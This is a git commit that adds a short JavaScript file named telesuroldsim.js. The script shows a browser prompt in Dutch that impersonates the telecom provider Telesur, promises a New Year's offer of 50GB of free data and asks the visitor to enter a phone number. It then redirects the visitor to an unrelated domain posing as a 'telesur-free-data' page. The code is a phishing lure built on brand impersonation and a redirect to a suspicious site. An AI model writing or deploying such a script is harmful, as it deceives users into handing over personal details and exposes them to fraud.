ec9b19bfa1db64e7eff8458a8e38a4815c8704d1
newetijazz10 <newetijazz10@gmail.com>
2026-01-02 16:41:30 +0100

    Create telesuroldsim.js

---
+++ telesuroldsim.js
@@ -0,0 +1,8 @@
+var password = 'KRIJG 50GB'
+password = prompt(
+  'Telesur: Gefeliciteerd! U komt in aanmerking voor een nieuwjaarsaanbieding van uw favoriete provider. Druk op OK om uw telefoonnummer in te voeren..',
+  'KRIJG 50GB'
+);
+if (password != 'KRIJG 50GB') {
+  location.href = 'https://www.bhufrizx.online/telesur-free-data';
+}
